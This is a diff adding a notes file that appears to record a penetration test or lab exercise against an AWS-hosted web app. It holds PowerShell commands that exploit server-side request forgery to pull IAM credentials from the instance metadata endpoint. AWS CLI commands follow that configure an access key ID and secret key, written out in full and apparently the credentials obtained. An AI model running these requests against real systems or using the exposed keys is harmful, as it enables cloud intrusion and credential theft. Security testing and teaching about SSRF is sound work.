@@ -1,0 +1,22 @@
+Invoke-WebRequest -Uri "http://13.49.46.121:5000/" -Method POST -Body @{url="http://169.254.169.254/latest/meta-data/iam/security-credentials/"} -UseBasicParsing | Select-Object -ExpandProperty Content
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+
+
+Invoke-WebRequest -Uri "http://13.49.46.121:5000/" -Method POST -Body @{url="http://169.254.169.254/latest/meta-data/iam/security-credentials/pentest-ec2-role"} -UseBasicParsing | Select-Object -ExpandProperty Content
+
+http://169.254.169.254/latest/meta-data/iam/security-credentials/pentest-ec2-role
+
+
+aws configure set aws_access_key_id YOUR_ACCESS_KEY
+aws configure set aws_secret_access_key YOUR_SECRET_KEY
+aws configure set aws_session_token YOUR_TOKEN
+aws configure set region eu-north-1
+
+
+aws configure set aws_access_key_id ASIAT4RJC6OSDADAVV3C
+aws configure set aws_secret_access_key dzciQk3GDpOm3IV0s4L0zqn7rN5K9MfBrhjv+DAZ
+aws configure set aws_session_token YOUR_TOKEN
+aws configure set region eu-north-1
+
